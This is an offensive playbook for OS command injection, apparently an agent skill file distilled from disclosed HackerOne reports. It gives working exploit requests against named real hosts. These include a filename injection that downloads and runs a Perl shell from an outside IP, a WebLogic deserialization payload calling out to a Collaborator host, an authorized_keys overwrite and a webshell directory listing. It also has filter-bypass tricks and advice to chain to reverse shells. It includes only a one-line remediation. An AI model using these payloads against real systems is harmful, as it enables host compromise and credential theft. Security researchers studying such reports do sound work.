---
name: command-injection
description: "OS Command Injection offensive playbook from 102 disclosed HackerOne reports (55 critical, 25 high, 19 medium, 3 low). Use when hunting or reviewing os command injection. Triggers: command, injection, remote, code, execution."
license: "For authorized security testing and education only."
---

# OS Command Injection

> Distilled from **102** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Input is passed to a shell/OS command, letting you run arbitrary commands on the host.

## Where to hunt

- Find features that shell out: file conversion, image/video processing, ping/traceroute tools, archive handling, git operations, PDF generation.
- Inject shell metacharacters and OAST callbacks; use time delays for blind cases.

## Exploitation playbook

- Break out with `;`, `|`, `&&`, `$(...)`, backticks, newlines; confirm via `sleep`/DNS callback.
- Chain to reverse shell or read files/credentials.

## Bypass techniques

- Filter evasion: `${IFS}` for spaces, quoting/concatenation (`c''at`), globbing, base64-decode-pipe, env vars.
- Argument injection where you can't fully break out but can inject dangerous flags.

## Impact & escalation

- Full host compromise, lateral movement, cloud metadata theft.

## Remediation

- Avoid shells; use argv-array exec with a fixed binary, strict input allowlists, and no string interpolation into commands.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#546753](https://hackerone.com/reports/546753)  -  Remote Code Execution via Extract App Plugin
*high*

```http
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 98
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lb…

nameOfFile=sample.rar"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|"&directory=&external=0
```

### 2. [#546753](https://hackerone.com/reports/546753)  -  Remote Code Execution via Extract App Plugin
*high*

```http
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 66
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lb…

nameOfFile=sample.rar"|perl /tmp/shell2.pl|"&directory=&external=0
```

### 3. [#810778](https://hackerone.com/reports/810778)  -  Remote OS Command Execution on Oracle Weblogic server via [CVE-2017…
*critical*

```http
POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
Host: raebilling.mtn.co.za
Content-Type: text/xml
Content-Type: text/xml;charset=UTF-8
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
        <void index="2">
                  <string>ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
```

### 4. [#733072](https://hackerone.com/reports/733072)  -  Path traversal, to RCE
*high, $12,000*

```bash
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```

### 5. [#506646](https://hackerone.com/reports/506646)  -  Webshell via File Upload on ecjobs.starbucks.com.cn
*critical*

```bash
curl -i -s -k  -X $'GET' \
    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
```

### 6. [#810755](https://hackerone.com/reports/810755)  -  Remote OS Command Execution on Oracle Weblogic server via [CVE-2017…
*critical*

```http
POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1
Host: raebilling.mtn.co.za
Content-Length: 426
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <object class="java.lang.Thread" method="sleep">
          <long>40000</long>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

More payloads: see [payloads.md](payloads.md) (176 curated).

## Recurring patterns in this dataset

Most frequent terms across the 102 reports (term (count)): `command` (93), `injection` (75), `remote` (36), `code` (34), `execution` (33), `arbitrary` (23), `allowed` (23), `attacker` (20), `commands` (18), `rce` (16), `execute` (15), `access` (13), `server` (13), `insecure` (12), `shell` (12), `discovered` (11), `gitlab` (10), `unsanitized` (9)

## Worked example  -  [report #1679624](https://hackerone.com/reports/1679624)

*Remote Command Execution via Github import* (critical, $33,510)

> Summary This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/ Remote%20Command%20Execution%20via%20Github%20import and allows arbitrary redis commands to be injected when imported a GitHub repository. When importing a GitHub repo the api client uses Sawyer for handling the responses. This takes a json hash and converts it into a ruby class that has methods matching all of the keys: https://github.com/lostisland/sawyer/blob/v0.9.2/lib/sawyer/resource.rb L106-L110 This happens recursively, and allows for any method to be overridden including built-in methods such as to s. The redis gem uses to s and bytesize to generate the RESP…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1679624](https://hackerone.com/reports/1679624) | critical | $33,510 | gitlab | Remote Command Execution via Github import |
| [#1609965](https://hackerone.com/reports/1609965) | critical | $33,510 | gitlab | RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag) |
| [#591295](https://hackerone.com/reports/591295) | critical | $20,160 | x | Potential pre-auth RCE on Twitter VPN |
| [#658013](https://hackerone.com/reports/658013) | critical | $12,000 | gitlab | Git flag injection - local file overwrite to remote code execution |
| [#587854](https://hackerone.com/reports/587854) | critical | $12,000 | gitlab | Local files could be overwritten in GitLab, leading to remote command execution |
| [#1418891](https://hackerone.com/reports/1418891) | critical | $6,000 | aiven_ltd | Apache Flink RCE via GET jar/plan API Endpoint |
| [#365271](https://hackerone.com/reports/365271) | critical | $5,000 | basecamp | Remote code execution on Basecamp.com |
| [#653125](https://hackerone.com/reports/653125) | critical | $3,500 | gitlab | Git flag injection leading to file overwrite and potential remote code execution |

*See [reference.md](reference.md) for all 102 reports in this class.*
